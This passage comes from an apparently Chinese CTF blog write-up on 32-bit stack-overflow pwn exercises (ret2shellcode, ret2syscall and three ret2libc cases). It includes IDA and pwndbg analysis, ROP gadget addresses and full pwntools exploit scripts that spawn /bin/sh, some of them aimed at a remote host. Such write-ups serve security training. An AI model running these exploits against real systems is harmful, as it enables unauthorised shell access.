<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*									<span class="comment">#导入库</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)	<span class="comment">#调试的相关信息</span></span><br><span class="line">io=remote(<span class="string">&#x27;101.35.231.134&#x27;</span>,<span class="number">10000</span>)					<span class="comment">#远程访问</span></span><br><span class="line"><span class="comment">#io=process(&#x27;./ret2shellcode&#x27;)						#本地访问，这题不知道为啥打不通</span></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./ret2shellcode&#x27;)							#导入文件</span></span><br><span class="line"></span><br><span class="line">shellc=asm(shellcraft.sh())							<span class="comment">#调用系统函数自动生成</span></span><br><span class="line">buf2_addr=<span class="number">0x0804A080</span>								<span class="comment">#buf2的地址，让返回地址修改为这个</span></span><br><span class="line"></span><br><span class="line">payload=shellc.ljust(<span class="number">0x6c</span>+<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(buf2_addr)	<span class="comment">#构造payload</span></span><br><span class="line">io.sendline(payload)								<span class="comment">#发送</span></span><br><span class="line">io.interactive()									<span class="comment">#与远程交互</span></span><br></pre></td></tr></table></figure>

<p>拿到shell</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617165203505.png" alt="image-20220617165203505" style="zoom:80%;" />



<h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p><strong>保护检查</strong></p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616194848607.png" alt="image-20220616194848607" style="zoom:80%;" />

<p>32位，开启了NX保护</p>
<p>ida查看程序文件</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617102809148.png" alt="image-20220617102809148" style="zoom:80%;" />

<p>看到了危险函数gets函数</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617105411878.png" alt="image-20220617105411878" style="zoom:80%;" />

<p>跟前面一样，动调算一下偏移值</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617105536928.png" alt="image-20220617105536928" style="zoom:80%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esp            0xffffcf30         </span><br><span class="line">ebp            0xffffcfb8 </span><br><span class="line">v4---&gt;esp+0x1c=0xffffcf4c</span><br><span class="line">v4相对于ebp偏移---&gt;offset=0x6c</span><br><span class="line">因为是32位，故v4相对于返回地址的偏移---&gt;0x6c+4</span><br></pre></td></tr></table></figure>

<p>可以利用系统调用来获取shell，比较常用的是下面这个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br><span class="line">系统调用号，即 eax 应该为 0xb</span><br><span class="line">第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</span><br><span class="line">第二个参数，即 ecx 应该为 0</span><br><span class="line">第三个参数，即 edx 应该为 0</span><br></pre></td></tr></table></figure>

<p>对于对应的参数，可以借鉴这个网站：<a href="https://publicki.top/old/syscall.html">https://publicki.top/old/syscall.html</a></p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617112104732.png" alt="image-20220617112104732" style="zoom:80%;" />

<p>使用ROPgadget查找gadgets</p>
<p>eax的gadgets</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617160518058.png" alt="image-20220617160518058" style="zoom:80%;" />

<p>使用我选中的那一行可以直接对ebx、ecx、edx进行赋值</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617160816757.png" alt="image-20220617160816757" style="zoom:80%;" />

<p>&#x2F;bin&#x2F;sh这个字符串的地址</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617161022248.png" alt="image-20220617161022248" style="zoom:80%;" />

<p>int 0x80的地址</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617161107749.png" alt="image-20220617161107749" style="zoom:80%;" />

<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)</span></span><br><span class="line">io=process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./rop&#x27;)</span></span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)									<span class="comment">#之前计算的需要填充的偏移</span></span><br><span class="line">pop_eax=<span class="number">0x080bb196</span>									<span class="comment">#eax,ret</span></span><br><span class="line">pop_e3x=<span class="number">0x0806eb90</span>									<span class="comment">#edx,ecx,ebx,ret</span></span><br><span class="line">bin_sh=<span class="number">0x080be408</span>									<span class="comment">#/bin/sh				</span></span><br><span class="line">int_0x80=<span class="number">0x08049421</span>									<span class="comment">#int 0x80</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(pop_eax)+p32(<span class="number">0x0b</span>)+p32(pop_e3x)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_sh)+p32(int_0x80)										   <span class="comment">#构造payload</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到shell</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617165348158.png" alt="image-20220617165348158" style="zoom:80%;" />



<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><h2 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h2><p><strong>保护检查</strong></p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617202842455.png" alt="image-20220617202842455" style="zoom:80%;" />

<p>32位，开启NX检查</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617203134019.png" alt="image-20220617203134019" style="zoom:80%;" />

<p>查看调用了的一些函数，可以看到gets、system函数</p>
<p>ida打开看看</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617203657889.png" alt="image-20220617203657889" style="zoom: 80%;" />

<p>发现可以造成溢出的gets寒素</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617203738980.png" alt="image-20220617203738980" style="zoom:80%;" />

<p>在plt表中可以看到调用了system函数(在初始页面按ctrl+s选择plt表跳转)</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617204005123.png" alt="image-20220617204005123" style="zoom:80%;" />

<p>在查看字符串的时候(shift+f12)，发现字符串&#x2F;bin&#x2F;sh</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617204301525.png" alt="image-20220617204301525" style="zoom:80%;" />

<p>现在整理一下可以利用的东西：可以造成溢出的gets函数、系统调用函数system以及字符串&#x2F;bin&#x2F;sh</p>
<p>除了可以通过ida直接查看字符串的地址，还可以通过ROPgadget</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617205228929.png" alt="image-20220617205228929" style="zoom:80%;" />



<p>计算s和返回地址的偏移(方法和前面一样)</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617204730342.png" alt="image-20220617204730342" style="zoom:80%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esp            0xffffcf10       </span><br><span class="line">ebp            0xffffcf98</span><br><span class="line"></span><br><span class="line">s:esp+0x1c=0xffffcf2c</span><br><span class="line">s相对于ebp的偏移：offset=ebp-s=0x6c</span><br><span class="line">s相对于返回地址的偏移：0x6c+4</span><br></pre></td></tr></table></figure>



<p><strong>攻击思路</strong></p>
<p>利用gets函数的栈溢出修改返回地址并使之执行system(“&#x2F;bin&#x2F;sh”)，拿到shell</p>
<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)</span></span><br><span class="line">io=process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)									<span class="comment">#需要填充的垃圾数据</span></span><br><span class="line">bin_sh=<span class="number">0x08048720</span>									<span class="comment">#先前查询的地址</span></span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]						<span class="comment">#可以使用pwntools库中的函数直接查找，也可以像下面这样把ida中找到的直接写出来</span></span><br><span class="line"><span class="comment">#system=0x08048460</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(system_plt)+<span class="string">b&#x27;bbbb&#x27;</span>+p32(bin_sh)	<span class="comment">#构造payload，中间加了b&#x27;bbbb&#x27;是因为在调用函数的时候，同时需要一个对应的返回地址，这里的b&#x27;bbbb&#x27;作为虚假的地址，因为此时已经拿到了shell</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到shell</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210035884.png" alt="image-20220617210035884" style="zoom:80%;" />



<h2 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h2><p><strong>保护检查</strong></p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210220822.png" alt="image-20220617210220822" style="zoom:80%;" />

<p>和例1一样，32位，开启NX保护</p>
<p>ida打开看看</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210500398.png" alt="image-20220617210500398" style="zoom:80%;" />

<p>可以造成栈溢出的gets函数</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617212503114.png" alt="image-20220617212503114" style="zoom:80%;" />

<p>查看字符串(shift+f12)，和第一题相比，可以看到没有了字符串&#x2F;bin&#x2F;sh</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210556495.png" alt="image-20220617210556495" style="zoom:80%;" />

<p>在plt表中可以找到system函数</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617211320710.png" alt="image-20220617211320710" style="zoom:80%;" />

<p>在bss段可以找到一个连续的空间，并且动调发现bss段可执行</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617211915506.png" alt="image-20220617211915506" style="zoom:80%;" />

<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617211848614.png" alt="image-20220617211848614" style="zoom:80%;" />

<p>计算s和返回地址的偏移</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; info reg</span><br><span class="line">eax            0xffffcf2c          -12500</span><br><span class="line">ecx            0xffffffff          -1</span><br><span class="line">edx            0x13                19</span><br><span class="line">ebx            0x0                 0</span><br><span class="line">esp            0xffffcf10          0xffffcf10</span><br><span class="line">ebp            0xffffcf98          0xffffcf98</span><br><span class="line">esi            0xf7fb2000          -134537216</span><br><span class="line">edi            0xf7fb2000          -134537216</span><br><span class="line">eip            0x80486ba           0x80486ba &lt;main+114&gt;</span><br><span class="line">eflags         0x286               [ PF SF IF ]</span><br><span class="line">cs             0x23                35</span><br><span class="line">ss             0x2b                43</span><br><span class="line">ds             0x2b                43</span><br><span class="line">es             0x2b                43</span><br><span class="line">fs             0x0                 0</span><br><span class="line">gs             0x63                99</span><br><span class="line"></span><br><span class="line">s相对于返回地址的偏移:ebp-(esp+0x1c)+4=0x6c+4</span><br></pre></td></tr></table></figure>

<p><strong>攻击思路</strong></p>
<p>和例1很像，不过缺少字符串&#x2F;bin&#x2F;sh，故可以调用gets函数把字符串&#x2F;bin&#x2F;sh写道bss段上，然后修改返回地址执行system(“&#x2F;bin&#x2F;sh”)</p>
<p>buf2的地址</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617214054803.png" alt="image-20220617214054803" style="zoom:80%;" />

<p>pop_ebx</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617214223568.png" alt="image-20220617214223568" style="zoom:80%;" />



<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)</span></span><br><span class="line">io=process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)							</span><br><span class="line">buf2_addr=<span class="number">0x0804A080</span>						</span><br><span class="line">pop_ebx=<span class="number">0x0804843d</span></span><br><span class="line">gets_plt=elf.plt[<span class="string">&#x27;gets&#x27;</span>]					<span class="comment">#可以这样直接调用函数，也可以在ida中查</span></span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]				<span class="comment">#同上</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(gets_plt)+p32(pop_ebx)+p32(buf2_addr)+p32(system_plt)+<span class="string">b&#x27;bbbb&#x27;</span>+p32(buf2_addr)								<span class="comment">#这里的pop主要是为了返回用的进而执行system函数</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>关于payloa的构造，wiki上面没有详细说明，为了方便理解，画了一张流程图</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/ret2libc2_01.png" alt="ret2libc2_01" style="zoom:80%;" />

<p>我先开始也看不太明白，请教了高师傅后才理解的，后来高师傅还给我推荐了一个构造payload的方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span> + p32(gets_plt) + p32(sys_plt) + p32(buf2)+p32(buf2)</span><br></pre></td></tr></table></figure>

<p>这个在栈上的分布如下图所示</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617224122737.png" alt="image-20220617224122737" style="zoom:80%;" />

<p>拿到shell</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617221719649.png" alt="image-20220617221719649" style="zoom:80%;" />



<h2 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h2><p><strong>保护检查</strong></p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102115483.png" alt="image-20220618102115483" style="zoom:80%;" />

<p>32位，开启NX保护</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102235365.png" alt="image-20220618102235365" style="zoom:80%;" />

<p>ida打开看看</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102436248.png" alt="image-20220618102436248" style="zoom:80%;" />

<p>发现危险函数gets函数</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102526005.png" alt="image-20220618102526005" style="zoom:80%;" />

<p>计算s和返回地址的偏移(方法和之前一样)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; info reg</span><br><span class="line">eax            0xffffcf2c          -12500</span><br><span class="line">ecx            0xffffffff          -1</span><br><span class="line">edx            0x12                18</span><br><span class="line">ebx            0x0                 0</span><br><span class="line">esp            0xffffcf10          0xffffcf10</span><br><span class="line">ebp            0xffffcf98          0xffffcf98</span><br><span class="line">esi            0xf7fb2000          -134537216</span><br><span class="line">edi            0xf7fb2000          -134537216</span><br><span class="line">eip            0x804868a           0x804868a &lt;main+114&gt;</span><br><span class="line">eflags         0x286               [ PF SF IF ]</span><br><span class="line">cs             0x23                35</span><br><span class="line">ss             0x2b                43</span><br><span class="line">ds             0x2b                43</span><br><span class="line">es             0x2b                43</span><br><span class="line">fs             0x0                 0</span><br><span class="line">gs             0x63                99</span><br><span class="line"></span><br><span class="line">s相对于返回地址的偏移:offset=ebp-(esp+0x1c)+4=0x6c+4</span><br></pre></td></tr></table></figure>

<p>程序中可以利用的最明显的就是gets函数的溢出。</p>
<p><strong>攻击思路</strong></p>
<p>利用gets函数的溢出泄露出libc版本，进而获取到system地址和&#x2F;bin&#x2F;sh地址，再次执行程序出发栈溢出执行system(“&#x2F;bin&#x2F;sh”)</p>
<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;101.35.231.134&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./ret2libc3&#x27;)							#我得本地打不出来，应该和Ubuntu版本有关</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]							<span class="comment">#利用puts函数打印出需要打印的函数的got地址</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]							<span class="comment">#随便选取一个libc库中调用的函数即可，我这里选的是puts的	</span></span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]								<span class="comment">#main函数地址</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(puts_plt)+p32(main)+p32(puts_got)	<span class="comment">#构造payload，这里修改返回调用为puts(puts_got)，puts函数的返回地址为主函数，方便泄露完成后构造shellc获取shell</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr=u32(io.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])			<span class="comment">#一般got地址是以\xf7开头，也可以像网上那样写，如下</span></span><br><span class="line"><span class="comment">#puts_addr=u32(sh.recv()[0:4])</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr---&gt;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_addr)))		<span class="comment">#打印出来看看</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)					<span class="comment">#利用库查找出libc</span></span><br><span class="line">base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">104</span>+p32(system)+<span class="string">b&#x27;bbbb&#x27;</span>+p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>当使用LibcSearcher查询不到时候(好像是版本的问题打不出来)，可以到网上去在线查询，输入相关的函数的地址(后3位即可)，在线查询网：<a href="https://publicki.top/libc/">https://publicki.top/libc/</a> 或者 <a href="https://libc.rip/">https://libc.rip/</a></p>
<p>本地没pwn掉应该是因为我用的是Ubuntu20的版本问题</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618125557365.png" alt="image-20220618125557365" style="zoom:80%;" />

<p>但是远程可以打通的</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618125708159.png" alt="image-20220618125708159" style="zoom:80%;" />
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
